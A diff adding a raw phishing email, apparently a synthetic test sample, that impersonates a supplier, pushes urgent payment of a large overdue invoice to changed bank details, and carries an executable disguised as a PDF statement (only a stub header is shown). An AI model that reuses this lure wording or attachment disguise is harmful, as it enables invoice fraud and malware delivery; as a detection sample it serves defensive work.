@@ -1,0 +1,73 @@
+From: "Trident Components Accounts" <billing@onlinesbi-verify.click>
+To: Anna Menon <anna.menon@vertexlogistics.in>
+Subject: Remittance advice INV-2025-3420 - action required
+Date: Sun, 17 May 2026 20:08:00 +0000
+Message-ID: <178772093952.6.3186918142143746430@onlinesbi-verify.click>
+Return-Path: <bounce-8214@onlinesbi-verify.click>
+MIME-Version: 1.0
+Received: from smtp-out-3.example (smtp-out-3.example [192.0.2.44]) by
+ mx.vertexlogistics.in (Postfix) with ESMTPS id BFC6D2F5E033 for
+ <recipient@vertexlogistics.in>; Sun, 17 May 2026 20:08:00 +0000
+Received: from relay.open-smtp.example (relay.open-smtp.example
+ [198.51.100.89]) by smtp-out-3.example (Postfix) with ESMTPS id FA07D72CC99B;
+ Sun, 17 May 2026 20:03:38 +0000
+Received-SPF: softfail (mailfrom) identity=mailfrom; client-ip=203.0.113.5;
+ envelope-from=<bounce@onlinesbi-verify.click>;
+Authentication-Results: mx.onlinesbi-verify.click; spf=softfail
+ smtp.mailfrom=onlinesbi-verify.click; dkim=fail
+ header.d=onlinesbi-verify.click; dmarc=fail (p=reject)
+ header.from=onlinesbi-verify.click
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=onlinesbi-verify.click; s=selector1; t=622224083; h=from:to:subject:date;
+ bh=5JMK0vK5bptr8Rh0kJmdloF1QGHqDzm2cywlybdFS2Q=; =?utf-8?q?b=3Dx3RU8bhDTkrz?=
+ =?utf-8?q?4v1nbu1IV2G+fhDMqAcT0dTiXMneqQ+hwWVT6gqHlBUSTRfikTbHXQQQjSunLtAep?=
+ =?utf-8?q?deWV6jJ0w=3D=3D?=
+Content-Type: multipart/mixed; boundary="===============6191274935930712857=="
+
+--===============6191274935930712857==
+Content-Type: multipart/alternative;
+ boundary="===============1447684851998563233=="
+
+--===============1447684851998563233==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello Anna,
+
+Please find attached invoice INV-2025-3420 for INR 3,269,000, now overdue. Ki=
+ndly
+review the attached statement and process this payment immediately to avoid
+service interruption.
+
+If the bank details have changed since your last remittance, use the updated
+account information in the attachment.
+
+Regards,
+Rahul Grant
+Accounts Receivable, Trident Components
+
+--===============1447684851998563233==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Segoe UI,Arial,sans-serif;font-size:14px;col=
+or:#202124"><p>Hello Anna,</p><p>Please find attached invoice INV-2025-3420 f=
+or INR 3,269,000, now overdue. Kindly review the attached statement and proce=
+ss this payment immediately to avoid service interruption.</p><p>If the bank =
+details have changed since your last remittance, use the updated account info=
+rmation in the attachment.</p><p>Regards, Rahul Grant Accounts Receivable, Tr=
+ident Components</p></body></html>
+
+--===============1447684851998563233==--
+
+--===============6191274935930712857==
+Content-Type: application/pdf
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement_INV-2025-3420.pdf"
+MIME-Version: 1.0
+
+TVqQAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRo
+aXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl
+
+--===============6191274935930712857==--
